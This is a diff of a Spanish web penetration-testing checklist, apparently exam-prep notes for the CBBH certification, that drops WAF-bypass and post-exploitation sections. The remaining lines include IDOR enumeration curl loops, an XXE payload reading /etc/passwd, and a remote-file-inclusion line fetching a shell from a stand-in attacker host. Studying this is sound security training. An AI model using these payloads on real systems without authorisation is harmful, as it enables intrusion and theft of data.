@@ -223,9 +223,6 @@
         - [ ] **Enumeración Masiva:**
             - [ ] Si se sospecha un patrón (ej. IDs numéricos, nombres de archivo predecibles), automatizar la prueba con scripts (Python, Bash) o Burp Intruder.
             - [ ] Ejemplo (bash para texto plano):
-                
-                Bash
-                
                 ```
                 # for i in {1..20}; do curl -s -X POST "http://<URL>/documents.php" -d "uid=$i" | grep "<li class='pure-tree_link'>"; done
                 # for i in {1..10}; do for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do curl -sOJ -X POST -d "contract=$hash" http://<URL>/download.php; done; done
@@ -328,21 +325,7 @@
 
 ### VI. Pruebas de Validación de Entradas (Input Validation Testing)
 
-#### A. Consideraciones Generales y Bypass de WAF
-
-- [ ] **Identificar Puntos de Entrada:** Formularios, parámetros URL, cabeceras HTTP, cookies, uploads de archivos, APIs JSON/XML.
-- [ ] **Bypass de Web Application Firewall (WAF):**
-    - [ ] Identificar si hay un WAF (`wafw00f`).
-    - [ ] Probar técnicas de evasión comunes:
-        - [ ] Case-sensitivity (`<SCRIPT>` en lugar de `<script>`).
-        - [ ] Encodings (URL, HTML, Hex, Unicode).
-        - [ ] Comentarios en medio de payloads (``, `/**/`).
-        - [ ] Uso de caracteres nulos (`%00`).
-        - [ ] Fragmentación de payloads.
-        - [ ] Payloads grandes para exceder límites de inspección (ver `nowafpls` y tamaños típicos).
-        - [ ] Ofuscación específica del lenguaje.
-
-#### B. Cross-Site Scripting (XSS)
+#### A. Cross-Site Scripting (XSS)
 
 - [ ] **Descubrimiento Manual y Automatizado:**
     - [ ] Identificar dónde la entrada del usuario se refleja en la respuesta.
@@ -383,13 +366,13 @@
 - [ ] **XSS en Cabeceras HTTP:** Si cabeceras como `User-Agent` o `Referer` se reflejan en la página.
 - [ ] **Revisar si el XSS se inyecta en el código backend (si es posible inferirlo).**
 
-#### C. HTML Injection
+#### B. HTML Injection
 
 - [ ] Comprobar si en campos sin validación por parte del usuario funcionan tags HTML simples (ej. `<h1>Test</h1>`, `<b>Test</b>`).
 - [ ] ¿Se puede inyectar un formulario falso para phising?
 - [ ] Diferenciar de XSS: el objetivo es inyectar HTML, no necesariamente JavaScript (aunque a menudo van juntos).
 
-#### D. SQL Injection (SQLi)
+#### C. SQL Injection (SQLi)
 
 - [ ] **Detección:**
     - [ ] **Manual:**
@@ -428,7 +411,7 @@
 - [ ] **Identificar qué parámetro es vulnerable si hay varios.** (ej. `id=`, `category=`, `search=`).
 - [ ] **Considerar diferentes tipos de bases de datos (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, NoSQL).**
 
-#### E. Command Injection (Inyección de Comandos del OS)
+#### D. Command Injection (Inyección de Comandos del OS)
 
 - [ ] **Detección:**
     - [ ] Identificar parámetros que puedan ser usados en comandos del sistema (ej. filenames, hosts para ping, etc.).
@@ -539,7 +522,7 @@
     - [ ] **Vía FTP/SMB:** `?page=ftp://user:pass@atacante.com/shell.txt`.
 - [ ] **RFI también puede usarse para SSRF (enumerar puertos internos, etc.).**
 
-### IX. Ataques Avanzados del Lado del Servidor
+### IX. Ataques del Lado del Servidor
 
 #### A. Server-Side Request Forgery (SSRF)
 
@@ -634,13 +617,12 @@
     - [ ] Buscar funcionalidades que procesen XML (uploads de XML/SOAP, APIs que acepten XML, RSS feeds).
     - [ ] Verificar si se puede controlar la `DOCTYPE` o si se parsean entidades.
     - [ ] Enviar un payload simple para ver si se procesa:
-
+       
         ```
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE foo [ <!ENTITY xxe "TEST_XXE"> ]>
         <data>&xxe;</data>
         ```
-        
 - [ ] **Explotación:**
     - [ ] **Local File Disclosure:**
         - [ ] `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
@@ -848,30 +830,3 @@
 - [ ] **File Upload Vulnerabilities en Plugins/Temas.**
 - [ ] **XSS, SQLi en Plugins/Temas.**
 
-### XII. Post-Explotación (Básica)
-
-- [ ] (Fuera del alcance principal de CBBH web, pero considerar)
-- [ ] Mantener acceso.
-- [ ] Escalar privilegios.
-- [ ] Pivotar a otras máquinas.
-
-### XIII. Consideraciones Finales y Metodología
-
-- [ ] **Documentar todo:** Peticiones, respuestas, payloads, hallazgos.
-- [ ] **Usar una metodología estructurada (ej. OWASP WSTG, PTES).**
-    - [ ] Planificación y Alcance.
-    - [ ] Recopilación de Información.
-    - [ ] Modelado de Amenazas / Análisis de Vulnerabilidades.
-    - [ ] Explotación.
-    - [ ] Post-Explotación.
-    - [ ] Reporte.1
-- [ ] **Elaboración del Informe:**
-    - [ ] Resumen Ejecutivo.
-    - [ ] Alcance y Objetivos.
-    - [ ] Metodología.
-    - [ ] Hallazgos (descripción, criticidad, evidencia, pasos para reproducir).
-    - [ ] Recomendaciones / Soluciones.
-    - [ ] Conclusión.
-- [ ] **Adaptarse a la aplicación específica y al alcance del pentest.**
-
-Esta checklist es extensa. Para el examen CBBH, concéntrate en comprender los conceptos detrás de cada punto y cómo ejecutar las pruebas clave, especialmente con las herramientas que has listado y las que son comunes en la industria. ¡Mucha suerte!
